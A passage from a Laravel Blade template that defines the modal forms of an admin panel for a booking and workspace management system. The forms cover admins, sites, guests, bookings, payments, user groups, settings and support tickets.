                                                $current_year = date('Y'); for ($count = $current_year; $count >= $DOB_YEAR_START; $count--) { ?>
                                                <option><?=$count?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Role Type</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a User..." class="form-control select" data-fouc
                                    id="admin-type" name="admin-type" required>
                                <option></option>
                                <optgroup label="Users">
                                    {{--<option value="1">Super Admin</option>--}}
                                    <option value="2">Admin</option>
                                    {{--<option value="3">Branch Manager</option>--}}
                                    <option value="4">Receptionist</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Image Upload</label>
                        <div class="col-sm-8">
                            <input type="file" class="form-control" name="avatar_url" id="avatar_url">
                        </div>
                    </div>
                    <h3 class="bg-danger text-center" id="admin_error_msg_container"></h3>

                    <div class="form-group row">
                        <button type="button" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple btn-add-admin ">Add</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
{{--Admin Add Modal--END}}

{{--Admin edit Modal--start--}}

<div id="edit-admin-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit Admin</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin-user-name-edit" name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Email</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" name="admin-email-edit" id="admin-email-edit"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" name="admin-password-edit"
                                   id="admin-password-edit"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Re-Type-Password</label>
                        <div class="col-sm-8">
                            <input type="password" class="form-control" name="admin-password-retype"
                                   id="admin-password-retype"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" data-fouc id="admin_branch_edit" required>
                                <option>Select Branch</option>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Role Type</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a User..." class="form-control select" data-fouc
                                    id="admin-type-edit" name="admin-type" required>
                                <option></option>
                                <optgroup label="Users">
                                    {{--<option value="1">Super Admin</option>--}}
                                    <option value="2">Admin</option>
                                    {{--<option value="3">Branch Manager</option>--}}
                                    <option value="4">Receptionist</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="admin_id">
                        <button type="button" class="btn bg-teal btn-update-admin ">update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>


{{--Branch edit Modal--start--}}

<div id="edit-branch-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit Site</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin-branch-name-edit" name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Address</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" name="admin-branch-address-edit"
                                   id="admin-branch-address-edit"
                                   required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="admin_branch_edit_id">
                        <button type="button" class="btn bg-teal" id="btn-update-branch">update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

{{-- Guest add Modal--start--}}

<div id="admin-add-guest-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add Guest</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Branch" id="admin_guest_branch"
                                    class="form-control select" data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Team</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Team" id="admin_guest_team" class="form-control select"
                                    data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin_guest_name" name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Email</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin_guest_email" name="admin-user-email"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Contact Number</label>
                        <div class="col-sm-8">
                            <input type="number" class="form-control" name="guest_contact_number"
                                   id="admin_guest_contact_number" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Guest Date</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year-booking" id="admin_visitor_date"
                                   placeholder="CHOOSE BOOKING DATE" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Guest Time </label>
                        <div class="col-sm-3">
                            <select id="admin_guest_time_from" class="form-control select" required>


                            </select>
                        </div>
                        <div class="col-sm-2 text-center font-weight-bold">

                        </div>
                        <div class="col-sm-3">
                            <select id="admin_guest_time_to" class="form-control select" required>


                            </select>
                        </div>

                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="edit_guest_id">
                        <button type="button" class="btn bg-teal  " id="btn-admin-add-guest">Add</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

{{-- Guest edit Modal--start--}}

<div id="admin-edit-guest-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit Guest</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="admin_edit_guest_name" name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Contact Number</label>
                        <div class="col-sm-8">
                            <input type="number" class="form-control" name="admin_edit_guest_contact_number"
                                   id="admin_edit_guest_contact_number" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Branch" id="admin_guest_branch_edit"
                                    class="form-control select"
                                    data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Team</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Branch" id="admin_guest_team_edit"
                                    class="form-control select"
                                    data-fouc required>


                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Guest Date</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year-booking" id="admin_edit_visitor_date"
                                   placeholder="CHOOSE BOOKING DATE" required>
                        </div>
                    </div>


                    <div class="form-group row" id="div_team_time_limit_from">
                        <label class="col-form-label col-sm-4">Guest Time From</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team"
                                   id="admin_edit_guest_time_from"
                                   placeholder="Choose time from" required>
                        </div>
                    </div>
                    <div class="form-group row " id="div_team_time_limit_to">
                        <label class="col-form-label col-sm-4">Guest Time To</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team"
                                   id="admin_edit_guest_time_to"
                                   placeholder="Choose time to" required>
                        </div>

                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="admin_edit_guest_id">
                        <button type="button" class="btn bg-teal  " id="btn-admin-update-guest">Update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>


{{--team members limit and time restriction  edit Modal--start--}}

<div id="edit-team-members-limit-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit Team Members Limit And Time</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Team Time Limit From</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team"
                                   id="edit_team_time_limit_from"
                                   placeholder="Choose time from" required>
                        </div>
                    </div>
                    <div class="form-group row ">
                        <label class="col-form-label col-sm-4">Team Time Limit To</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control  pickatime-intervals-team"
                                   id="edit_team_time_limit_to"
                                   placeholder="Choose time to" required>
                        </div>

                    </div>

                    <div class="form-group row" id="hide_team_limit_div">
                        <label id="team_label" class="col-form-label col-sm-4">Team Members Limit</label>
                        <div class="col-sm-2" id="team_members">
                            <input type="number" id="edit_members_limit" value="0" class="form-control" min="0">
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="team_id_to_edit_members_limit">
                        <button type="submit" class="btn bg-teal" id="btn-update-team-members-limit">update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>


{{--Admin edit cash register settings  Modal--start--}}

<div id="edit_admin_cash_register_settings_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit Cash Register Cash Limit</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Role</label>
                        <div class="col-sm-8">
                            <input type="text" readonly class="form-control" id="admin_cash_register_role"
                                   name="admin-user-name"
                                   required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Cash Limit</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" name="admin-email-edit"
                                   id="admin_cash_register_limit"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <input type="hidden" id="admin_id">
                        <button type="button" class="btn bg-teal" id="btn-admin-cash-register-update">update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

{{--Bracnh Add Modal--}}
<div id="add-branch-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Site</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="branch_name" required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">address</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="branch_address" required>
                        </div>
                    </div>


                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-add-branch ">Add</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>


{{--Admin Booking MOdal--}}
<div id="add_booking_modal_admin" class="modal fade" tabindex="-1">

    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Booking</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form class="form-horizontal" id="booking_form">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Site</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Site" id="admin_booking_branch"
                                    class="form-control select" data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Team</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Team" id="admin_booking_team" class="form-control select"
                                    data-fouc required>


                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Date</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year-booking" id="admin_booking_date"
                                   placeholder="CHOOSE BOOKING DATE" required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select room</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select an Item..." id="admin_booking_assets"
                                    class="form-control select" data-fouc required>
                                <option value="0">Select room</option>


                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Time</label>
                        <div class="col-sm-3">
                            <select id="admin_booking_from" class="form-control select" required>


                            </select>
                        </div>
                        <div class="col-sm-2 text-center font-weight-bold">

                        </div>
                        <div class="col-sm-3">
                            <select id="admin_booking_to" class="form-control select" required>


                            </select>
                        </div>

                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Room Price Per Hour</label>
                        <div class="col-sm-4">
                            <input type="text" class="form-control" id="room_price_admin" readonly>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Total booking price</label>
                        <div class="col-sm-4">
                            <input type="text" class="form-control" id="booking_price_total_admin" readonly>
                        </div>
                    </div>


                    <div class="form-group row">
                        <button type="button" id="submit_admin_booking" class="btn bg-primary">Confirm Booking</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

</div>


{{--Admin Payment MOdal--}}


<div id="admin_make_transaction_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Make a Transaction</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" id="make_transaction_form">
                <div class="modal-body">

                    <div class="form-group">


                        <select class="form-control select" name="admin_branch_id" id="admin_branch_id">

                        </select>

                    </div>

                    <div class="form-group">
                        <select data-placeholder="  Team Type..." class="form-control select"
                                id="admin_team_type" name="admin_team_type">
                            <option></option>
                            <optgroup label=" Team Type">
                                <option class="showImageBrowse" value="1">walking Customers
                                </option>
                                <option class="showImageBrowse" value="2">Residents</option>
                            </optgroup>
                        </select>
                    </div>

                    <div class="form-group">
                        <select class="form-control select" name="user_id" id="admin_team_id">

                        </select>
                    </div>
                    <div class="form-group">
                        <div class="col-sm-12">
                            <input type="date" class="form-control pickadate-year"
                                   id="admin_transaction_date"
                                   placeholder="Select Transaction Date" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <select data-placeholder="  Payment Type..." class="form-control select"
                                id="admin_payment_type" name="payment_type">
                            <option></option>
                            <optgroup label=" Payment Type">
                                <option class="showImageBrowse" value="1">Cash</option>
                                <option class="showImageBrowse" value="3">Cheque</option>
                                <option class="showImageBrowse" value="4">Withholding Challan
                                </option>
                            </optgroup>
                        </select>
                    </div>

                    <div class="form-group" id="transactionImageUploadBlockAdmin">
                        <label>Upload Image:</label>
                        <input type="file" class="form-control" id="transactionImageUploadAdmin"
                               name="transactionImageUploadAdmin" placeholder="Enter Amount">
                        <input type="text" name="transactionImageUploadUrlAdmin" value=""
                               disabled id="transactionImageUploadUrlAdmin">
                    </div>

                    <div class="form-group " id="cheque_withholding_challan_num_block">
                        <input type="text"  class="form-control" id="cheque_withholding_challan_num"
                               name="amount" placeholder="Cheque/Withholding Challan #" required>
                    </div>


                    <div class="form-group">
                        <select data-placeholder=" Transaction For..."
                                class="form-control select" id="admin_wallet_type"
                                name="wallet_type">
                            <option></option>
                            <optgroup label="Transaction For">
                                <option value="1">Billing</option>
                                <option value="2">Booking</option>
                                <option value="3">Printing</option>
                            </optgroup>
                        </select>
                    </div>

                    <div class="form-group">
                        {{--<input type="number" min="0" class="form-control" id="adminTransactionAmount"--}}
                               {{--name="amount" placeholder="Enter Amount">--}}


                        <input type="text" min="0" class="form-control" name="currency-field" id="adminTransactionAmount" pattern="^\$\d{1,3}(,\d{3})*(\.\d+)?$" value="" data-type="currency" placeholder=" Enter Amount 1,000,000.00">

                    </div>

                    <div class="form-group">
                                                <textarea rows="2" cols="50" type="text" id="note" name="note"
                                                          class="form-control"
                                                          placeholder="Write Transaction Note..."></textarea>
                    </div>

                    <div class="text-right">
                        <button type="button" value="Make Transaction" id="make_transaction_submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">
                            Make Transaction
                        </button>
                    </div>

                </div>

            </form>

        </div>
    </div>

</div>

{{--Admin filter by modal--}}

<div id="booking_filter_admin_modal" class="modal fade" tabindex="-1">

    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Filter Bookings</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="{{url('admin/post_booking')}}" method="GET">

                {{--<form class="form-horizontal" id="booking_form">--}}
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Site</label>
                        <div class="col-sm-8">
                            <select name="admin_booking_filter_branch" id="admin_booking_filter_branch"
                                    class="form-control select" data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Team</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Team" name="admin_booking_filter_team"
                                    id="admin_booking_filter_team" class="form-control select" data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <input type="submit" id="submit_booking_filter" class="btn bg-primary">
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

</div>


{{--Admin Booking Details MOdal--}}
<div id="booking_modal_admin_details" class="modal fade" tabindex="-1">

    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Booking Details</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Branch</label>
                        <div class="col-sm-8">
                            <input type="text" readonly class="form-control" id="booking_branch">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Team</label>
                        <div class="col-sm-8">
                            <input type="text" readonly class="form-control" id="booking_team">
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Asset</label>
                        <div class="col-sm-8">
                            <input type="text" readonly class="form-control" id="booking_asset">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking ID</label>
                        <div class="col-sm-8">
                            <input type="text" readonly class="form-control" id="booking_id">
                        </div>
                    </div>
                    <div class="form-group row">

                        <button type="button" id="delete_booking_admin" class="btn bg-danger">Delete</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

</div>


<!-- All User Modal -->
<div class="modal fade" id="allusersModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
     aria-hidden="true">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLabel"></h5>
                <button type="button" class="close" id="allusersclose" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <table class="table-users table" border="0">
                    <tbody id="userbody">
                    {{--<tr>--}}
                    {{--<td width="10" align="center">--}}
                    {{--<i class="fa fa-2x fa-user fw"></i>--}}
                    {{--</td>--}}
                    {{--<td>--}}
                    {{--John Smith--}}
                    {{--</td>--}}
                    {{--<td>--}}
                    {{--Admin--}}
                    {{--</td>--}}
                    {{--<td align="center">--}}
                    {{--<button class="btn btn-danger">Block</button>--}}
                    {{--</td>--}}
                    {{--</tr>--}}
                    </tbody>
                </table>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-danger" id="delete-group">Delete Group</button>
                <?php
                $uri = request()->segment(1);

                if($uri == "admin")
                {
                if(auth()->user()->type == 1)
                {
                ?>
                <button type="button" class="btn btn-primary btn-group-super-edit-user">Add More</button>
                <?php
                }
                }else{
                ?>
                <button type="button" class="btn btn-primary btn-group-edit-user">Add More</button>
                <?php
                }
                ?>
            </div>
        </div>
    </div>
</div>


<!-- Edit Group modal -->

<div id="user-group-edit-modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit a Group</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Group Name</label>
                        <div class="col-sm-8">
                            <input type="text" placeholder="Group Name" class="form-control" id="edit-user-group-name">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Users To Group</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select data-placeholder="Select Users"  multiple="multiple" class="form-control form-control-select2 select" data-fouc id="edit-users">
                                    <optgroup label="Select User">

                                    </optgroup>

                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="button" class="btn bg-primary" id="user-group-edit-submit">Update Group</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Super Admin Group modal -->
<div id="super-admin_group_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create a Group</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Group Name</label>
                        <div class="col-sm-8">
                            <input type="text" placeholder="Group Name" class="form-control" id="superadmin-group-name"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select class="form-control select" id="branch_admin" required>
                                    <option value="">--- Select ----</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    {{--<div class="form-group row">--}}
                    {{--<label class="col-form-label col-sm-4">Enter Group Name</label>--}}
                    {{--<div class="col-sm-8">--}}
                    {{--<input type="file" class="form-control" id="superadmin-group-img">--}}
                    {{--</div>--}}
                    {{--</div>--}}

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Users To Group</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select multiple="multiple" class="form-control select" id="super_admin_users"
                                        data-fouc required>
                                    <optgroup label="Users">

                                    </optgroup>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress"
                                id="superadmin-group-add-submit">Add
                            Group
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- Super Admin Group modal -->


<!-- Super Admin Group modal -->
<div id="super_admin_edit_group_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit a Group</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Group Name</label>
                        <div class="col-sm-8">
                            <input type="text" placeholder="Group Name" class="form-control"
                                   id="superadmin_edit_group_name" required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select class="form-control select" id="branch_edit_admin" required>
                                    <option value="">--- Select ----</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Users To Group</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select multiple="multiple" class="form-control select" id="super_edit_admin_users"
                                        data-fouc required>
                                    <optgroup label="Users">

                                    </optgroup>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress"
                                id="superadmin-group-update-submit">Add
                            Group
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- Super Admin Group modal -->

{{--Setting--}}
<div id="settings_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Setting</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-6" id="setting_name"></label>
                        <div class="col-sm-6">
                            <input type="text" class="form-control" id="setting_value" required>
                            <input type="hidden" id="setting_id">
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="button" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple" id="submit_setting_modal">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>


{{--Support Resolved--}}
<div id="admin_support_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Support</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Comment</label>
                        <div class="col-sm-8">
                            <textarea id="resolved_comment" class="form-control" ></textarea>
                            <input type="hidden" id="ticket_id">
                            <input type="hidden" id="ticket_status_value">
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="button" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple" id="submit_ticket_modal">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>